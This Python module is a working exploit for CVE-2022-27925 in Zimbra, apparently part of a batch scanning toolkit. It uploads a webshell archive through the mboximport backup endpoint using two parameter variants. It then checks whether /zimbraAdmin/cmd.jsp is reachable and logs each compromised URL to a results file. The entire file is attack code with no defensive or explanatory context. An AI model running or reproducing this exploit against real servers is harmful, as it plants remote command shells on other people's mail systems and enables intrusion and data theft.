import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



class Cve_2022_27925Poc2:
    def exploit(self,url, endpoint):
        headers = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        with open("./cve/BATCH_WORK/zimbra/webshell.zip", 'rb') as payload:

            try:
                req = requests.post(url + endpoint, timeout=60, data=payload,
                                    verify=self.ssl,proxies=self.proxy, headers=headers)

                if req.status_code == 401:
                    check_req = requests.get(url + "/zimbraAdmin/cmd.jsp")
                    if check_req.status_code == 200:
                        # print(msg)
                        print(f"[+] URL: {url}存在Zimbra漏洞")
                        with open("./result/zimbraRce.txt","a") as w:
                            w.write(f"{url}\n")

                        return True

            except Exception as e:
                # print(e)
                pass

    def main(self,target):
        flag = False
        url = target[0].strip("/ ")
        self.ssl = target[1]
        self.header = target[2]
        proxy = target[3]
        self.proxy = {"http":proxy,"https":proxy}

        endpoints = ["/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd",
                     "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]
        for endpoint in endpoints:
            flag = self.exploit(url, endpoint)
            if flag:
                break
        if not flag:
            # print("Exploit failed!")
            pass